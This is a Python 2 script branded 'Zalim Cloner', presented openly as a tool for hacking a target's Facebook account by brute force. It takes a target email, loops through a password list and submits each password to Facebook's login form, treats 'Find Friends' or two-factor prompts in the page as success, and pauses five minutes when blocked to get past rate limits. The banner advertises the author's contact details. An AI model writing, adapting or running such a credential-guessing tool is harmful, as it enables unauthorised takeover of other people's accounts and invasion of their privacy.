import time
import sys

if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 2.x
	use: python fb2.py
--------------------------------------
			''')
	sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

print("""\n


\033[1;96m---------------------Zalim💜Cloner---------------------




\033[1;86m_________ _______  _______  _______  _______ _________
\033[1;86m\__   __/(  ___  )(  ____ )(  ____ \(  ____ \\__   __/
\033[1;86m   ) (   | (   ) || (    )|| (    \/| (    \/   ) (   
\033[1;86m   | |   | (___) || (____)|| |      | (__       | |   
\033[1;86m   | |   |  ___  ||     __)| | ____ |  __)      | |   
\033[1;86m   | |   | (   ) || (\ (   | | \_  )| (         | |   
\033[1;86m   | |   | )   ( || ) \ \__| (___) || (____/\   | |   
\033[1;86m   )_(   |/     \||/   \__/(_______)(_______/   )_(   



                                                                       
\033[1;96m-----------------Zalim💜Cloner----------------------------------                                                                       


 
        \033[1;96m Welcome To Zalim Cloner BruteForce Target Tool 💜
                


\033[1;96m---------------------Zalim💜Cloner------------------------------
                
\033[0;95m╭═══════════════════════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m  "Zalim Cloner"                  x║x               
\033[0;91m║\033[0;91mFB ACC : \033[0;92m "Waleed.Ahmed.Mr.Zalim.FLY.Team" x║x                                                 
\033[0;91m║ \033[0;93mWhtsap: \033[0;91m   +92310-5943428                 x║x
\033[0;95m╰═══════════════════════════════════════════════════════════════╯
             
                
\033[1;96m-----------------Zalim💜Cloner----------------------------------


\033[1;95m Facebook Target Id Hack With BruteForce”¹

\033[1;91m Don't Judge Me So Quickly....!!!

                                                
\033[1;96m-----------------Zalim💜Cloner----------------------------------



---------------------------Zalim------------------------------------------


           \033[1;96mKaafile Mein Peechey Hun Kuch Baat Hai Varna,
           \033[1;96mMeri Khak Bhi Naa Paate Mere Saath Chalne Wale


---------------------------Zalim------------------------------------------
\n""")
file=open('passwords.txt','r')

email=str(raw_input('Enter Email/Username : ').strip())

print "\nTarget Email ID : ",email
print "\nTrying Passwords from list ..."

i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 6:
		continue
	print str(i) +" : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			response_data = response.read()
			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
				print('Your password is : ',passw)
				break
	except:
		print('\nSleeping for time : 5 min\n')
		time.sleep(300)
